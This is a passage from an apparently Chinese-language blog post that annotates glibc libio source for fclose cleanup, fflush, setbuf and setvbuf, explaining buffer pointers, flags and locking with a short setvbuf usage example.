class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">_IO_deallocate_file (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The current stream variables.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp == (FILE *) &amp;_IO_2_1_stdin_ || fp == (FILE *) &amp;_IO_2_1_stdout_</span><br><span class="line">      || fp == (FILE *) &amp;_IO_2_1_stderr_)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_legacy_file (fp))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="built_in">free</span> (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查要关闭的_IO<em>FILE是否为_IO_2_1_stdin\</em> ||_IO<em>2_1_stdout\</em>||_IO<em>2_1_stderr</em></p><p>是则直接返回,因为这三个流并不在堆上</p><p>否则的话该文件流就应该位于堆上,对其进行free</p><p>大致就是这么个流程</p><h1 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h1><p> fflush</p><p>刷新文件流函数</p><p>给定需要刷新的 FILE 指针，关闭成功返回 0,失败返回 EOF(-1)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fflush ( FILE * stream );</span><br></pre></td></tr></table></figure><p>如果当前的 stream 是为写入打开的，或者为了更新打开的且最后一个 io 操作是 output，那么任何在 outbuffer 中未写入的数据都将会被写入到文件中；如果 stream 是空指针，那么所有的 stream 将会被 flush。</p><p>fflush由_IO_fflush实现,位于libio/iofflush.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_fflush (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_flush_all ();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> result;</span><br><span class="line">      CHECK_FILE (fp, EOF);</span><br><span class="line">      _IO_acquire_lock (fp);</span><br><span class="line">      result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">      _IO_release_lock (fp);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fflush)</span><br></pre></td></tr></table></figure><h2 id="0x1all分支"><a href="#0x1all分支" class="headerlink" title="0x1all分支"></a>0x1all分支</h2><p>_IO_flush_all位于libio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We want locking.  */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_flush_all_lockp (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_flush_all)</span><br></pre></td></tr></table></figure><p>纯调用_IO_flush_all_lockp(1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);<span class="comment">//上锁</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);<span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);<span class="comment">//解锁</span></span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查当前 FILE 对象的情况，如果是以下两种情况：</p><ul><li>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO<em>write_ptr &gt; fp-&gt;_IO_write_base)</em>非宽字符</li><li>_(_IO_vtable_offset (fp) == 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base))宽字符</li></ul><p>则会调用_IO_OVERFLOW (fp, EOF)</p><p>_IO_OVERFLOW (fp, EOF)就是调用对应 fp 的函数指针实现对应的写入功能，最后实际调用到了_IO_do_write，将 f-&gt;_IO_write_base 开始，长度为（f-&gt;_IO_write_ptr - f-&gt;_IO_write_base）的数据写入文件,之前有提到过,这里不展开</p><h2 id="0x2指定fp分支"><a href="#0x2指定fp分支" class="headerlink" title="0x2指定fp分支"></a>0x2指定fp分支</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    CHECK_FILE (fp, EOF);</span><br><span class="line">    _IO_acquire_lock (fp);<span class="comment">//上锁</span></span><br><span class="line">    result = _IO_SYNC (fp) ? EOF : <span class="number">0</span>;</span><br><span class="line">    _IO_release_lock (fp);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="1-CHECK-FILE"><a href="#1-CHECK-FILE" class="headerlink" title="1.CHECK_FILE"></a>1.CHECK_FILE</h3><p>检查 FILE 对象是否合法，包括是否空指针，_flags 是否在合法范围内。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">865</span> <span class="meta">#<span class="keyword">ifdef</span> IO_DEBUG</span></span><br><span class="line"><span class="number">866</span> <span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;             \                                                                                                    </span></span><br><span class="line"><span class="number">867</span>     <span class="keyword">if</span> ((FILE) == <span class="literal">NULL</span>                      \</span><br><span class="line"><span class="number">868</span>     || ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)  \</span><br><span class="line"><span class="number">869</span>       &#123;                             \</span><br><span class="line"><span class="number">870</span>     __set_errno (EINVAL);                   \</span><br><span class="line"><span class="number">871</span>     <span class="keyword">return</span> RET;                     \</span><br><span class="line"><span class="number">872</span>       &#125;                             \</span><br><span class="line"><span class="number">873</span>   &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">874</span> <span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="number">875</span> <span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123; &#125; while (0)</span></span><br><span class="line"><span class="number">876</span> <span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="2-sync"><a href="#2-sync" class="headerlink" title="2.sync"></a>2.sync</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure><p>write缓冲区中如果有数据未写入</p><p>调用_IO_do_flush(fp)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><h1 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h1><p>setbuf指定对应文件流 stream 的 IO 操作 buffer，此时该 stream 就一定是使用缓存 buffer 的，或者如果 buffer 指针为 NULL，那么此时的 stream 会被禁用缓存 buffer。</p><ul><li>使用缓存 buffer：读写文件时的信息并不是与文件完全相同的，只有当调用了 fflush 函数才会将缓存 buffer 中的信息同步到文件中；</li><li>不使用缓存 buffer：那么写入的信息将会尽可能快地同步到文件中。</li></ul><blockquote><p>注意：<strong>buffer 的 size 大小有要求为 BUFSIZ</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void setbuf ( FILE * stream, char * buffer );</span><br></pre></td></tr></table></figure><p>假设两个 FILE 对象，其中一个设置为 buffer，另一个设置为 no buffer，那么 pFile1 只有再调用 fflush(pFile1)之后信息才完全写入文件，而 pFile2 的信息是尽可能快地写入文件，不必使用 fflush，当然，最后 fclose 之后，buffer 中的信息都会同步到文件中.</p><p>setbuf位于libio/setbuf.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">setbuf</span> <span class="params">(FILE *fp, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_setbuffer (fp, buf, BUFSIZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仅是调用 _IO_setbuffer,位于libio/iosetbuffer.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setbuffer (FILE *fp, <span class="type">char</span> *buf, <span class="type">size_t</span> size)<span class="comment">//size是不可控的</span></span><br><span class="line">&#123;</span><br><span class="line">  CHECK_FILE (fp, );<span class="comment">//检查fp是否有效</span></span><br><span class="line">  _IO_acquire_lock (fp);<span class="comment">//上锁</span></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//将IO_LINE_BUF行缓冲标志设置为0</span></span><br><span class="line">  <span class="keyword">if</span> (!buf)<span class="comment">//参数为NULL</span></span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">  (<span class="type">void</span>) _IO_SETBUF (fp, buf, size);<span class="comment">//首先调用_IO_new_file_setbuf</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_CHECK_WIDE (fp))</span><br><span class="line">    <span class="comment">/* We also have to set the buffer using the wide char function.  */</span></span><br><span class="line">    (<span class="type">void</span>) _IO_WSETBUF (fp, buf, size);<span class="comment">//宽字符额外设置,暂且不表</span></span><br><span class="line">  _IO_release_lock (fp);<span class="comment">//释放锁</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setbuffer)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;\</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((FILE) == NULL\</span></span><br><span class="line"><span class="meta">|| ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)\</span></span><br><span class="line"><span class="meta">      &#123;\</span></span><br><span class="line"><span class="meta">__set_errno (EINVAL);\</span></span><br><span class="line"><span class="meta">return RET;\</span></span><br><span class="line"><span class="meta">      &#125;\</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><h2 id="0x1-4"><a href="#0x1-4" class="headerlink" title="0x1"></a>0x1</h2><p>先看_IO_new_file_setbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;<span class="comment">//修改w缓存指针</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//设置r缓存指针</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><p>又先调用_IO_default_setbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags |= _IO_UNBUFFERED;<span class="comment">//设置nobuf</span></span><br><span class="line">_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;<span class="comment">//取消nobuf标志</span></span><br><span class="line">_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;<span class="comment">//清空rw缓存指针</span></span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);</p><p>_IO_setb (fp, p, p+len, 0);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<span class="comment">//如果文件流存在buffer且不是保留buf模式</span></span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;<span class="comment">//buf缓冲区设置</span></span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;<span class="comment">//使文件流关闭时不处理buf</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>总结就是修改缓冲区及相应标志位再重置rw指针</p><h1 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h1><p> setvbuf</p><p>改变文件流 buffer 函数</p><p>指定对应文件流 stream 的 IO 操作 buffer，同时设定该块缓存 buffer 的操作 mode 和 size 大小，如果 buffer 指针是空指针，那么 setvbuf 函数将会自动分配一块默认大小大小的 buffer 作为缓存使用。</p><p>只有buf不为null时,size才有效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int setvbuf ( FILE * stream, char * buffer, int mode, size_t size );</span><br></pre></td></tr></table></figure><blockquote><p>注意：上面的 mode 有以下的选择</p></blockquote><ul><li>_IOFBF：Full Buffering:<strong>输出操作中</strong>，数据在 buffer 写满后写入物理文件；<strong>输入操作中</strong>，buffer 只有在全为空时才被填写，填充的可能是多行数据；</li><li>_IOLBF：Line Buffering:<strong>输出操作中</strong>，数据在新的一行插入 FILE 流对象或 buffer 写满时触发写入物理文件；<strong>输入操作中</strong>，buffer 只有在 buffer 全为空时，写入新的一行到 buffer 中。</li><li>_IONBF：No Buffering:不使用缓存 buffer，所有输入输出操作都尽可能快地写入物理文件，当前模式下，buffer 和 size 参数将会被忽略</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The possibilities for the third argument to `setvbuf&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOFBF 0<span class="comment">/* Fully buffered.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOLBF 1<span class="comment">/* Line buffered.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IONBF 2<span class="comment">/* No buffering.  */</span></span></span><br></pre></td></tr></table></figure><blockquote><p>注意：setvbuf 的调用时机，在一个文件流对象绑定到一个打开的文件之后，对该文件流对象进行文件读写操作之前。</p></blockquote><p>可以看如下的例子：</p><p>打开了一个 pFIle 对象，并将其 buffer 设置为 NULL(函数内部将自动生成一块大小为 1024Byte 大小的 buffer)，mode 设置为_IOFBF。那么，在进行文件操作过程中，如向文件写入过程中，每写满 1024 字节才会触发一次将数据写入物理文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* setvbuf example */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *pFile;</span><br><span class="line"></span><br><span class="line">  pFile=fopen (<span class="string">&quot;myfile.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  setvbuf ( pFile , <span class="literal">NULL</span> , _IOFBF , <span class="number">1024</span> );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// File operations here</span></span><br><span class="line"></span><br><span class="line">  fclose (pFile);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setvbuf调用的是_IO_setvbuf<br>函数位于libio/iosetvbuf.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_setvbuf (FILE *fp, <span class="type">char</span> *buf, <span class="type">int</span> mode, <span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  CHECK_FILE (fp, EOF);<span class="comment">//同样的校验</span></span><br><span class="line">  _IO_acquire_lock (fp);<span class="comment">//同样的上锁</span></span><br><span class="line">  <span class="keyword">switch</span> (mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> _IOFBF:<span class="comment">//全缓冲</span></span><br><span class="line">      fp-&gt;_flags &amp;= ~(_IO_LINE_BUF|_IO_UNBUFFERED);<span class="comment">//置空行缓冲和无缓冲标志</span></span><br><span class="line">      <span class="keyword">if</span> (buf == <span class="literal">NULL</span>)<span class="comment">//未指定buffer地址</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is no flag to distinguish between &quot;fully buffered</span></span><br><span class="line"><span class="comment"> mode has been explicitly set&quot; as opposed to &quot;line</span></span><br><span class="line"><span class="comment"> buffering has not been explicitly set&quot;.  In both</span></span><br><span class="line"><span class="comment"> cases, 